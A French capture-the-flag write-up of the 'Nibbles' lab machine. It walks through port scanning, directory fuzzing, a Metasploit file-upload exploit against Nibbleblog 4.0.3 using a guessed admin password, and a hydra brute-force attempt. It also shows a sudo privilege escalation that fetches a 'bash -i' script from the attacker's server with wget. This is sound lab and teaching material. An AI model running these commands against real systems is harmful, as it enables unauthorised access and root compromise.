# Nibbles [Linux] Easy

# — 1.Enumération—

## Nmap

`nmap -sS -A -sC -sV 10.10.10.75`

```bash
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

[http://10.10.10.75/nibbleblog/](http://10.10.10.75/nibbleblog/)

[http://10.10.10.75/nibbleblog/feed.php](http://10.10.10.75/nibbleblog/feed.php)

## Ffuf

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.117/FUZZ

themes                  [Status: 301, Size: 322, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10]
content                 [Status: 301, Size: 323, Words: 20, Lines: 10]
```

## Metasploit :

Dans view-source:[http://10.10.10.75/nibbleblog/admin/boot/rules/98-constants.bit](http://10.10.10.75/nibbleblog/admin/boot/rules/98-constants.bit) On trouve la version de l'application : 4.0.3

Cette version est exploitable avec MetaSploit : [https://www.exploit-db.com/exploits/38489](https://www.exploit-db.com/exploits/38489)

Dans [http://10.10.10.75/nibbleblog/content/private/users.xml](http://10.10.10.75/nibbleblog/content/private/users.xml) on trouve l'username admin

En essayant au hasard le mot de passe est `nibbles`

`use multi/http/nibbleblog_file_upload`

Pour les information à rentrer nous mettons : LHOSTS [Notre IP], RHOST [10.10.10.75], set TARGETURI nibbleblog, set USERNAME admin, set PASSWORD nibbles

`sudo -l` :

```bash
User nibbler may run the following commands on Nibbles:
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Le fichier n'existant pas nous allons créé les dossier et créé un fichier nous permettant si exécuter d'être root

On créé le fichier [monitor.sh](http://monitor.sh/) sur notre machine contenant seulement

```bash
bash -i
```

On créé un serveur avec python : `python -m http.server 80`

Sur la machine attaquer : `wget [http://NotreIP/monitor.sh](http://10.10.14.16/monitor.sh)`

Puis on exécute en tant que root le fichier : `sudo ./monitor.sh`

Cela nous créé un shell en tant que root et nous pouvons récupérer le deuxième flag !

# Notes

[http://10.10.10.75/nibbleblog/admin.php](http://10.10.10.75/nibbleblog/admin.php) Page de connexion à l'admin panel
On va brute force la page avec hydra :
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password."`

[80][http-post-form] host: 10.10.10.75   login: admin   password: 1234567
[80][http-post-form] host: 10.10.10.75   login: admin   password: princess
[80][http-post-form] host: 10.10.10.75   login: admin   password: 123456

Le problème c'est que nous sommes Blacklists en utilisant ces mot de passes.